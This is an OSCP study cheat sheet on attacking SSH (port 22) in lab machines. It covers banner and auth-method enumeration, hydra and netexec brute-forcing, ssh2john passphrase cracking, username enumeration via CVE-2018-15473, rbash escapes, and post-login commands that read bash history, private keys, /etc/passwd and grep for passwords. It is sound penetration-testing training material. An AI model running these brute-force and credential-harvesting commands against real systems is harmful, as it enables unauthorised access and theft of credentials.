# 🔐 SSH — Port 22

> **Secure Shell.** Encrypted remote login/command execution. On OSCP, SSH is rarely the *entry* by itself — it's where **found credentials and private keys cash out into a shell**, and a superb **pivot** point. Treat it as the destination for loot from every other service.

Related: [[Credential Attacks]] · [[Shells]] · [[Pivoting and Port Forwarding]] · [[Linux Privilege Escalation]]

---

## 🧠 PORT 22 → THINK

- **Do I have creds/keys yet?** SSH is where you *use* them, not usually where you find them.
- **Private key anywhere?** (`id_rsa` from FTP/SMB/web/LFI) → `ssh -i`.
- **Version?** banner → OS hint + rare CVEs (user enum CVE-2018-15473, old libssh auth bypass).
- **Password auth enabled?** decides whether brute is even possible.
- **Weak/known creds?** default app creds, reused web/DB creds.
- **Post-login:** [[Linux Privilege Escalation]] + [[Pivoting and Port Forwarding]] (local ports, other subnets).
- **Restricted shell?** (rbash) → escape.

---

## ⚡ QUICK TRIAGE (60 seconds)

```bash
export IP=10.10.10.10
```

```bash
nmap -p22 -sV $IP                       # banner: OpenSSH version + OS hint
```

```bash
ssh -v user@$IP                          # see offered auth methods (publickey/password)
```
**Verdict:**
- Have a cred/key already → log in now.
- No creds yet → SSH is a **holding pattern**; go find creds elsewhere and come back. Don't blind-brute root.
- Very old OpenSSH/libssh → check the specific CVE.

---

## ⏱️ 5-MINUTE ENUMERATION

```bash
nmap -p22 -sV -sC $IP                    # banner + host key + supported algos
```

```bash
# Which auth methods does it accept?
ssh -o PreferredAuthentications=none -o BatchMode=yes $IP 2>&1 | grep -i 'authentication methods\|permission denied'
```

```bash
# If you already have a key:
chmod 600 id_rsa && ssh -i id_rsa user@$IP
```

```bash
# If you already have creds:
ssh user@$IP        # or: sshpass -p 'pass' ssh user@$IP
```
**Look for:** `password` in allowed auth methods (brute possible), `publickey` only (need a key), OpenSSH version.

---

## 🔬 15–30 MINUTE DEEP ENUMERATION

```bash
# Version → known issues
nmap -p22 -sV $IP ; searchsploit openssh <version>
```

```bash
# Username enumeration (only vulnerable OpenSSH 7.2–7.7, CVE-2018-15473)
# (situational — use a searchsploit PoC or msf auxiliary/scanner/ssh/ssh_enumusers)

# Targeted brute — ONLY with a real userlist + likely passwords (rockyou), watch lockouts
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4 -f
```

```bash
netexec ssh $IP -u users.txt -p passwords.txt --continue-on-success
```

```bash
# Encrypted key you found? crack the passphrase:
ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

---

## 📖 WHAT — the service

- **Purpose:** encrypted shell, remote command exec, secure file transfer (scp/sftp), and tunneling/port-forwarding.
- **Port:** 22/tcp (sometimes moved to a high port — scan all ports).
- **Servers:** **OpenSSH** (ubiquitous), Dropbear (embedded), libssh-based.
- **Auth methods:** `password`, `publickey` (key pairs), `keyboard-interactive`, sometimes host-based/GSSAPI.
- **Attack surface:** weak/reused passwords, exposed/weak private keys, username enumeration (specific versions), rare protocol/impl CVEs (libssh CVE-2018-10933 auth bypass), post-auth = full box + pivot.

## 💡 WHY — why it matters in OSCP

- The **cash-out** for every credential and key you find anywhere → interactive shell.
- **Best pivot** on Linux: local/remote/dynamic port forwarding into internal services & subnets ([[Pivoting and Port Forwarding]]).
- Occasionally a direct win: weak creds, an exposed key, a restricted-shell escape, or a version CVE.

---

## 🔎 HOW: MANUAL ENUMERATION

### Banner & host details
```bash
nc -nv $IP 22                    # raw banner: SSH-2.0-OpenSSH_X.Y ...
```

```bash
nmap -p22 -sV -sC $IP            # version, host keys, algorithms
```
- Banner version → OS hint (e.g. `OpenSSH_8.2p1 Ubuntu` → Ubuntu 20.04) and `searchsploit` target.

### Which auth methods are allowed?
```bash
ssh -o PreferredAuthentications=none -o BatchMode=yes user@$IP
# server replies with e.g. "Permitted authentication methods: publickey,password"
```
- `password` present → brute/reuse is possible. `publickey` only → you **need a key**.

### Using a found key
```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa user@$IP
```

```bash
# guess the user from key location/username/comment; try common users if unknown
ssh -i id_rsa -o IdentitiesOnly=yes root@$IP
```

## 🤖 HOW: AUTOMATED ENUMERATION

```bash
nmap -p22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods $IP
```

```bash
# username enum (version-gated):
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $IP; set USER_FILE users.txt; run"
```

---

## 🔐 AUTHENTICATION

| Vector | How | When |
|---|---|---|
| Found password | `ssh user@$IP` / `sshpass` | You have creds |
| Private key | `ssh -i id_rsa user@$IP` | You found a key |
| Encrypted key | `ssh2john`+`john` → passphrase | Key has a passphrase |
| Weak/default | targeted `hydra`/`netexec` | Password auth on + userlist |
| Reused creds | any pw from web/DB/SMB/FTP | Almost always try this |

```bash
# Brute — targeted only, low threads, watch for fail2ban/lockout:
hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4 -f
```

```bash
netexec ssh $IP -u bob -p /usr/share/wordlists/rockyou.txt
```
> ⚠️ Don't spray huge lists at `root` blindly — slow, noisy, often fail2ban-blocked, and not the OSCP intent. Use **found usernames + likely passwords**.

## 👤 USER ENUMERATION

- **CVE-2018-15473** (OpenSSH 7.2–7.7): timing/response difference reveals valid users (`ssh_enumusers` / searchsploit PoC). Only on those versions.
- Otherwise, get usernames from **other services** (SMB/web/SMTP/FTP) and try them here.

## 📂 RESOURCE / FILE ENUMERATION (post-login)

```bash
id; sudo -l; ls -la ~; cat ~/.ssh/*; cat ~/.bash_history
```

```bash
find / -name authorized_keys 2>/dev/null
```

```bash
cat /etc/passwd                       # other users to pivot to
```

```bash
ls -la /home/*                         # readable home dirs?
```

## ⚙️ CONFIGURATION ENUMERATION

- `/etc/ssh/sshd_config` (if readable): `PermitRootLogin`, `PasswordAuthentication`, `AllowUsers`, `PermitEmptyPasswords`, forced commands.
- `authorized_keys` you can write → persistence/access.
- Restricted shell (`rbash`) config → plan an escape.

---

## 🎯 VULNERABILITY IDENTIFICATION

```bash
nmap -p22 -sV $IP ; searchsploit openssh <version> ; searchsploit dropbear
```
| Vuln | Target | Effect |
|---|---|---|
| **CVE-2018-15473** | OpenSSH 7.2–7.7 | 🟡 username enumeration |
| **libssh CVE-2018-10933** | libssh 0.6–0.8.3 servers | 🔵 auth bypass (rare) |
| Weak/exposed private key | any | 🟢 direct login |
| Reused/weak password | any | 🟢 direct login |

> Modern OpenSSH almost never has a pre-auth RCE on the exam. If you're hunting an SSH *RCE*, you're probably in a rabbit hole — go find creds/keys instead.

---

## 🗡️ ATTACK VECTORS

### 🟢 HIGH PROB — Credential / key reuse → login
The main event. Any password or `id_rsa` found on **any** service → SSH login.
```bash
chmod 600 id_rsa; ssh -i id_rsa user@$IP
```

```bash
ssh user@$IP        # reused web/DB/FTP/SMB password
```

### 🟢 HIGH PROB — Crack an encrypted key
```bash
ssh2john id_rsa > h; john --wordlist=/usr/share/wordlists/rockyou.txt h; john --show h
```

### 🟡 MED PROB — Targeted password brute
Real usernames + rockyou, low threads, mindful of fail2ban.

### 🟡 MED PROB — Restricted shell escape
`rbash`/limited shell → break out:
```bash
ssh user@$IP -t "bash --noprofile"        # request a different shell
# or from inside: vi→:!/bin/sh ; python3 -c 'import pty;pty.spawn("/bin/bash")'
```
See [[Linux Privilege Escalation]] (GTFOBins).

### 🔵 SITUATIONAL — version CVEs (user enum, libssh bypass).

---

## 🔑 CREDENTIAL HUNTING (post-login)
> One command per block so you can copy-paste each individually.

Shell history — passwords typed on the command line:
```bash
cat ~/.bash_history
```
SSH private key — reuse against other users/hosts:
```bash
cat ~/.ssh/id_rsa
```
Known hosts — reveals other machines this user connects to (pivot targets):
```bash
cat ~/.ssh/known_hosts
```
Recursive grep for secrets in the common credential-bearing directories:
```bash
grep -riE 'password|passwd|secret' /home /var/www /opt 2>/dev/null
```
What can I run as root without a password? (top privesc check):
```bash
sudo -l
```
Users to target / pivot to:
```bash
cat /etc/passwd
```
Everything → [[Credential Attacks]] and reuse across the subnet.

## 💥 EXPLOITATION → INITIAL ACCESS

```
Port 22
 ├─ Have key? ─▶ ssh -i (guess/known user) ─▶ shell ✅
 ├─ Have password (reused)? ─▶ ssh ─▶ shell ✅
 ├─ Encrypted key? ─▶ ssh2john+john ─▶ passphrase ─▶ shell ✅
 ├─ Password auth on + userlist? ─▶ targeted brute ─▶ shell ✅
 ├─ rbash after login? ─▶ escape ─▶ full shell
 └─ Nothing yet ─▶ go enumerate other services for creds/keys, return
```

## 🧹 POST-EXPLOITATION (immediately after login)
> One command per block so you can copy-paste each individually.

Orient — user, host, and kernel/OS (decides the privesc path):
```bash
id; whoami; hostname; uname -a
```
What can I run as root without a password? (#1 privesc check):
```bash
sudo -l
```
Shell history — passwords typed on the command line:
```bash
cat ~/.bash_history
```
SSH keys/config for this user (reuse / pivot targets):
```bash
ls -la ~/.ssh
```
Then run linpeas for the full sweep.
- **Escalate:** [[Linux Privilege Escalation]] (sudo -l, SUID, cron, capabilities, kernel).
- **Pivot:** `ss -tlnp`/`netstat` for internal services; set up forwarding → [[Pivoting and Port Forwarding]].
- **Loot & reuse:** keys, histories, configs → other users/hosts.

## 🧗 PRIVILEGE ESCALATION CONNECTIONS

SSH gives the shell; escalation is all [[Linux Privilege Escalation]]. First three moves: `sudo -l`, SUID sweep, and read `~/.bash_history` + `~/.ssh`. SSH is also your **tunnel** to reach privesc-relevant internal services.

---

## 🔁 FOUND → NEXT

| FINDING | MEANING | NEXT ACTION | POSSIBLE RESULT | NEXT DECISION |
|---|---|---|---|---|
| `id_rsa` found | Possible direct login | `chmod 600; ssh -i` (guess user) | shell | Post-exploit/privesc |
| Encrypted `id_rsa` | Need passphrase | ssh2john + john | passphrase → shell | Login |
| Reused password | Likely login | `ssh user@IP` | shell | Enumerate |
| OpenSSH 7.2–7.7 | User-enum CVE | ssh_enumusers | valid users | Targeted brute |
| `password` auth allowed | Brute viable | hydra with real userlist | creds | Login |
| `publickey` only | Need a key | hunt keys on other services | key | Login |
| `sudo -l` after login | PrivEsc path | run allowed binary (GTFOBins) | root | Done |
| Internal-only ports | Pivot targets | SSH `-L`/`-D` forward | reach new service | Enumerate it |

## 🚧 FAILED → NEXT

| Symptom | Do this |
|---|---|
| No creds/keys at all | SSH is not the way in yet — enumerate web/SMB/FTP for creds, return |
| Key rejected | Wrong username (try key comment, common users), `chmod 600`, `-o IdentitiesOnly=yes` |
| "Permission denied (publickey)" | Password auth is off — you need a key, not a password |
| Brute gets blocked | fail2ban/lockout — stop, use found creds only, lower threads |
| Login drops to rbash | escape via allowed binaries / `ssh -t bash` / vi/python |
| Old cipher/kex refused by client | `ssh -oKexAlgorithms=+... -oHostKeyAlgorithms=+ssh-rsa user@IP` |
| Key format error | Fix perms/line endings; convert PuTTY `.ppk` with `puttygen key.ppk -O private-openssh -o id_rsa` |

## 🛠️ TROUBLESHOOTING

```bash
# Legacy servers refusing modern client:
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa user@$IP
```

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@$IP
# PuTTY key → OpenSSH:
```

```bash
puttygen key.ppk -O private-openssh -o id_rsa; chmod 600 id_rsa
```

```bash
# Non-interactive password login:
sshpass -p 'Password1' ssh -o StrictHostKeyChecking=no user@$IP
```

## ⚠️ COMMON MISTAKES

- Blind-brute-forcing `root` with huge lists (slow, blocked, wrong intent).
- Forgetting `chmod 600` on a key (ssh refuses it).
- Wrong **username** for a found key (guess from comment/context/`/etc/passwd`).
- Not checking **which auth methods** are allowed before brute-forcing.
- Ignoring `sudo -l` as the very first post-login command.
- Missing SSH as a **pivot** to internal services.

## 🔗 CREDENTIAL REUSE

SSH creds/keys flow both ways:
```bash
netexec smb $IP -u user -p pass         # 445
```

```bash
mysql -u user -p'pass' -h $IP           # 3306
# and every SSH password/key found → try on all OTHER hosts in the subnet
```
See [[Credential Attacks]].

## 🌐 CROSS-SERVICE ATTACKS

- **Keys/creds from [[FTP]]/[[SMB]]/[[HTTP]] → SSH login.**
- **SSH pivot → internal DBs/web/SMB** unreachable from your host ([[Pivoting and Port Forwarding]]).
- **Usernames from any service → SSH targeted brute.**
- **`/etc/passwd` (via LFI) → SSH userlist.**

## 🧭 OSCP EXAM MINDSET

Seeing 22, an experienced tester thinks: *"Not my way in yet — it's my way in later."* They don't grind SSH; they **go collect keys and passwords** from the noisy services and return to SSH to cash them in. Post-login, the reflex is `sudo -l` → SUID → history → keys, and to remember SSH is the **pivot** to everything internal. Blind brute-forcing SSH is a classic time-sink; targeted reuse is the pro move.

## ✅ DON'T MISS

- [ ] Banner/version (OS hint + CVEs)
- [ ] Which **auth methods** are allowed
- [ ] Try **every** found key (`chmod 600`) and reused password
- [ ] Crack encrypted keys (`ssh2john`)
- [ ] Guess the right **username** for a key
- [ ] `sudo -l` immediately after login
- [ ] Use SSH as a **pivot** for internal services
- [ ] Reuse SSH creds across all hosts

## 🛑 STOP CONDITION

If you have **no creds/keys**, SSH is exhausted for now — stop and enumerate elsewhere; return the moment you find a credential or key. With creds: once logged in, SSH's job is done — the work shifts to [[Linux Privilege Escalation]] and [[Pivoting and Port Forwarding]]. Don't brute-force indefinitely (fail2ban + wasted time).

## 📇 EXAM CHEAT SHEET

```bash
export IP=10.10.10.10
```

```bash
nmap -p22 -sV -sC $IP                              # version + host keys
```

```bash
ssh -o PreferredAuthentications=none user@$IP       # see allowed auth methods
```

```bash
# Key login:
chmod 600 id_rsa; ssh -i id_rsa user@$IP
```

```bash
ssh2john id_rsa > h; john --wordlist=rockyou.txt h  # crack passphrase
```

```bash
# Password / reuse:
ssh user@$IP ; sshpass -p 'pass' ssh user@$IP
```

```bash
hydra -l user -P rockyou.txt ssh://$IP -t 4 -f      # targeted brute
```

```bash
# Legacy algos:
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa user@$IP
```

```bash
# Post-login first moves:
id; sudo -l; cat ~/.bash_history; ls -la ~/.ssh
```
**Sequence:** version → auth methods → use found key/password → (crack key) → login → `sudo -l` → privesc/pivot.
**Kill shots:** found `id_rsa`/password reuse → shell · crackable key passphrase · `sudo -l` misconfig → root.
